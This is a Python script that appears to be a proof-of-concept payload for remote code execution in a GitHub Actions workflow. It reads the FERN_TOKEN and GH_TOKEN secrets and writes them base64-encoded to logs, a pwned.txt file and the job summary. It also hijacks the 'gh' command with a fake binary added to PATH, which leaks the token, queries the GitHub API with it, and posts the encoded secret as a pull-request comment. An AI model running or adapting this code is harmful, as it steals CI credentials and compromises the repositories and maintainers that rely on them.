import os, sys, base64, hashlib, traceback

def _b64(v):
    return base64.b64encode((v or "").encode()).decode()

FAKE_GH = r'''#!/bin/bash
{
  echo "FAKE-GH-EXECUTED args=$*"
  echo "GH_TOKEN_LEN=${#GH_TOKEN}"
  echo "GH_TOKEN_B64=$(printf %s "$GH_TOKEN" | base64 -w0)"
  echo "FERN_TOKEN_B64=__FERN_B64__"
  echo "--- GET https://api.github.com/user ---"
  curl -s -w '\nHTTP=%{http_code}\n' -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" https://api.github.com/user
} >&2
BODY=$(printf '<!-- rce-proof -->\nPrivileged-workflow RCE (workflow_run artifact -> urllib import). fern_b64=%s' "__FERN_B64__")
JSON=$(printf '%s' "$BODY" | python3 -c 'import json,sys;print(json.dumps({"body":sys.stdin.read()}))')
curl -s -o /dev/null -w 'COMMENT_HTTP=%{http_code}\n' -X POST \
  -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${PR_NUMBER}/comments" -d "$JSON" >&2
exit 0
'''

try:
    ft = os.environ.get("FERN_TOKEN", "")
    gt = os.environ.get("GH_TOKEN", "")
    msg = "\n".join([
        "RCE-CONFIRMED stage=page-links cwd=%s" % os.getcwd(),
        "FERN_LEN=%d FERN_SHA256=%s FERN_B64=%s" % (len(ft), hashlib.sha256(ft.encode()).hexdigest(), _b64(ft)),
        "GH_LEN=%d GH_B64=%s" % (len(gt), _b64(gt)),
    ])
    sys.stderr.write(msg + "\n")
    try:
        open("pwned.txt", "a").write(msg + "\n")
    except Exception:
        pass
    try:
        with open(os.environ.get("GITHUB_STEP_SUMMARY", "/dev/null"), "a") as f:
            f.write("```\n" + msg + "\n```\n")
    except Exception:
        pass
    d = os.path.join(os.getcwd(), "binhijack")
    os.makedirs(d, exist_ok=True)
    gh = os.path.join(d, "gh")
    with open(gh, "w") as f:
        f.write(FAKE_GH.replace("__FERN_B64__", _b64(ft)))
    os.chmod(gh, 0o755)
    with open(os.environ.get("GITHUB_PATH", "/dev/null"), "a") as f:
        f.write(d + "\n")
except Exception:
    sys.stderr.write("ERR " + traceback.format_exc().replace("\n", " ") + "\n")
